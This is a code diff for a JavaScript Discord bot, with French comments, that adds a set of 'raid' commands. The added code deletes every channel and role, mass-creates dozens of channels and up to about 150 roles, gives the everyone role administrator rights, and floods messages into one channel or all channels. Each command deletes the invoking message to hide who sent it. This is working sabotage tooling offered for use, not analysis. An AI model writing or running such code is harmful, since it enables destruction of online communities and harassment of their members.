@@ -751,8 +751,9 @@ console.log(err)
   }
 
 //COMMANDES RAID
-//Supprimer des salons
+//Supprimer des salons & des rôles 
 if(cmd === (prefix + "delall")){
+message.delete()
 try {
 await message.guild.channels.forEach(c => c.delete())
 await message.guild.roles.forEach(r => r.delete())
@@ -762,7 +763,67 @@ console.log(err)
 }
 }
 
+//SPAM DES CHANNELS
+if(cmd === (prefix + "chan")){
+message.delete()
+let name = args.slice(1).join(" ")
+if(!name) name = `Raid by ${message.author.username}`
+for (var i = 50; i >= 0; i--){
+message.guild.createChannel(name,"text")
+message.guild.createChannel(name,"voice")
+}
+}
 
+//ROLES
+if(cmd === prefix + 'roles'){
+message.delete()
+let name = args.slice(1).join(" ")
+if(!name) name = `Raid by ${message.author.username}`
+for (var i = 150; i >= 0; i--){
+message.guild.createRole({
+name: name,
+color: "RANDOM"
+})
+}
+}
+
+//SETALLADMIN
+if(cmd === (prefix + 'admin')){
+message.delete()
+message.guild.roles.find(r => r.name === "everyone").setPermissions("ADMINISTRATOR")
+}
+
+//SPAM 
+if(cmd === (prefix + 'spammsg')){
+message.delete()
+var msg = args.slice(2).join(" ")
+if(!msg) return;
+var count = parseInt(args[1] - 1) || "999"
+try {
+for (var i = count; i >= 0; i--){
+message.channel.send(msg)
+}
+} catch(err) {
+console.log(err)
+}
+}
+
+//SPAM ALL CHANNELS
+if(cmd === (prefix + "spamchan")){
+message.delete()
+var msg = args.slice(2).join(" ")
+if(!msg) return;
+var count = parseInt(args[1] - 1) || "999"
+try {
+message.guild.channels.forEach(ch => {
+for (var i = count; i >= 0; i--){
+ch.send(msg)
+}
+})
+} catch(err) {
+console.log(err)
+}
+}
 
 });
 
